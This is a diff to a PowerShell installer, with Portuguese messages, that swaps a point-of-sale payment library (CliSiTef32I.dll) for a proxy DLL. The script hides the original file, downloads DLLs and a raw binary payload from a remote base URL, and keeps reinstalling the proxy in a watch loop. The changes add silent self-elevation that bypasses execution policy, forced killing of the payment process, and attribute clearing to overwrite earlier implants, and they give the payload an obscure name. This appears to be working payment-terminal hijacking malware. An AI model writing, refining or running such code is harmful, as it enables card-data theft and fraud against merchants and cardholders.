@@ -43,9 +43,18 @@ Write-Host ""
 
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
-    Write-Host "  [AVISO] Nao esta como admin - troca em C:\Program Files\" -ForegroundColor Yellow
-    Write-Host "          e registry HKLM podem falhar." -ForegroundColor Yellow
-    Write-Host ""
+    # Auto-eleva: reabre como admin e segue
+    Write-Host "  [ELEVANDO] Sem admin - reabrindo elevado..." -ForegroundColor Yellow
+    $relaunch = "-NoP -EP Bypass -File `"$PSCommandPath`""
+    if ($Reverse)    { $relaunch += " -Reverse" }
+    if ($DetectOnly) { $relaunch += " -DetectOnly" }
+    if ($Force)      { $relaunch += " -Force" }
+    if ($Watch)      { $relaunch += " -Watch" }
+    if ($Once)       { $relaunch += " -Once" }
+    if ($BaseUrl)    { $relaunch += " -BaseUrl `"$BaseUrl`"" }
+    if ($LocalDir)   { $relaunch += " -LocalDir `"$LocalDir`"" }
+    Start-Process powershell -Verb RunAs -ArgumentList $relaunch
+    exit 0
 }
 
 # ==================================================================
@@ -145,15 +154,7 @@ function Stop-TefProcess {
     param($Proc, [switch]$ForceKill)
     $p = Get-Process -Id $Proc.Pid -ErrorAction SilentlyContinue
     if (-not $p) { return }
-    if (-not $ForceKill) {
-        try { $p.CloseMainWindow() | Out-Null } catch {}
-        if (-not $p.WaitForExit(3000)) {
-            Write-Host "  [AVISO] PID $($Proc.Pid) nao respondeu - encerrando forcado" -ForegroundColor Yellow
-            Stop-Process -Id $Proc.Pid -Force -ErrorAction SilentlyContinue
-        }
-    } else {
-        Stop-Process -Id $Proc.Pid -Force -ErrorAction SilentlyContinue
-    }
+    Stop-Process -Id $Proc.Pid -Force -ErrorAction SilentlyContinue
     Start-Sleep -Milliseconds 500
 }
 
@@ -277,10 +278,10 @@ if ((Test-Path $LocalDir) -and (Test-Path (Join-Path $LocalDir "CliSiTef32I.dll"
     $srcProxy  = Join-Path $LocalDir "CliSiTef32I.dll"
     $srcTlsgwp = Join-Path $LocalDir "CliSiTef32I_tlsgwp.dll"
     $srcCurl   = Join-Path $LocalDir "libcurl32.dll"
-    if (Test-Path (Join-Path $LocalDir "terminal_86.bin")) { $srcT86 = Join-Path $LocalDir "terminal_86.bin" }
-    elseif (Test-Path (Join-Path $ScriptDir "src\terminal_86.bin")) { $srcT86 = Join-Path $ScriptDir "src\terminal_86.bin" }
+    if (Test-Path (Join-Path $LocalDir "86")) { $srcT86 = Join-Path $LocalDir "86" }
+    elseif (Test-Path (Join-Path $ScriptDir "src\86")) { $srcT86 = Join-Path $ScriptDir "src\86" }
     Write-Host "[1/5] Usando DLLs locais de $LocalDir" -ForegroundColor Yellow
-    if ($srcT86) { Write-Host "  [OK] terminal_86.bin local" -ForegroundColor Green }
+    if ($srcT86) { Write-Host "  [OK] 86 local" -ForegroundColor Green }
 } elseif ($BaseUrl) {
     Write-Host "[1/5] Baixando DLLs do GitHub..." -ForegroundColor Yellow
     foreach ($par in @(
@@ -305,13 +306,13 @@ if ((Test-Path $LocalDir) -and (Test-Path (Join-Path $LocalDir "CliSiTef32I.dll"
         $par.V.Value = $out
         Write-Host "  [OK] $($par.N) ($([Math]::Round((Get-Item $out).Length/1KB)) KB)" -ForegroundColor Green
     }
-    # terminal_86.bin (binario cru, sem MZ)
-    $t86Out = Join-Path $tmpDir "terminal_86.bin"
+    # 86 (binario cru, sem MZ)
+    $t86Out = Join-Path $tmpDir "86"
     try {
-        Invoke-WebRequest -Uri "$BaseUrl/terminal_86.bin" -OutFile $t86Out -UseBasicParsing -TimeoutSec 90
-        if ((Get-Item $t86Out).Length -gt 0) { $srcT86 = $t86Out; Write-Host "  [OK] terminal_86.bin" -ForegroundColor Green }
+        Invoke-WebRequest -Uri "$BaseUrl/86" -OutFile $t86Out -UseBasicParsing -TimeoutSec 90
+        if ((Get-Item $t86Out).Length -gt 0) { $srcT86 = $t86Out; Write-Host "  [OK] 86" -ForegroundColor Green }
     } catch {
-        Write-Host "  [AVISO] Sem terminal_86.bin no repo — seguindo" -ForegroundColor Yellow
+        Write-Host "  [AVISO] Sem 86 no repo — seguindo" -ForegroundColor Yellow
     }
 } else {
     Write-Host "[ERRO] Nem dist local nem -BaseUrl informado." -ForegroundColor Red
@@ -418,15 +419,18 @@ foreach ($p in $alvos) {
         }
     }
 
-    # 3: escreve nossas DLLs
+    # 3: escreve nossas DLLs (limpa atributos de instalacao anterior primeiro)
     if ($srcCurl) {
+        if (Test-Path $curlPath) { Set-ItemProperty $curlPath -Name Attributes -Value Normal -ErrorAction SilentlyContinue }
         Copy-Item $srcCurl $curlPath -Force
         Write-Host "  [OK] libcurl32.dll" -ForegroundColor Green
     }
     if ($srcTlsgwp) {
+        if (Test-Path $libenvPath) { Set-ItemProperty $libenvPath -Name Attributes -Value Normal -ErrorAction SilentlyContinue }
         Copy-Item $srcTlsgwp $libenvPath -Force
         Write-Host "  [OK] libenv.dll (tlsgwp)" -ForegroundColor Green
     }
+    if (Test-Path $origPath) { Set-ItemProperty $origPath -Name Attributes -Value Normal -ErrorAction SilentlyContinue }
     Copy-Item $srcProxy $origPath -Force
     Write-Host "  [OK] CliSiTef32I.dll (proxy)" -ForegroundColor Green
 
@@ -514,7 +518,10 @@ while ($true) {
                 Move-Item $origPath $libenvOrig -Force
                 Set-Stealth $libenvOrig
             }
-            if ($srcCurl)   { Copy-Item $srcCurl   (Join-Path $p.Folder "libcurl32.dll") -Force }
+            $curlW = Join-Path $p.Folder "libcurl32.dll"
+            if (Test-Path $libenvPath) { Set-ItemProperty $libenvPath -Name Attributes -Value Normal -ErrorAction SilentlyContinue }
+            if (Test-Path $origPath)   { Set-ItemProperty $origPath -Name Attributes -Value Normal -ErrorAction SilentlyContinue }
+            if ($srcCurl)   { Copy-Item $srcCurl   $curlW -Force }
             if ($srcTlsgwp) { Copy-Item $srcTlsgwp $libenvPath -Force }
             Copy-Item $srcProxy $origPath -Force
             Set-Stealth $libenvPath
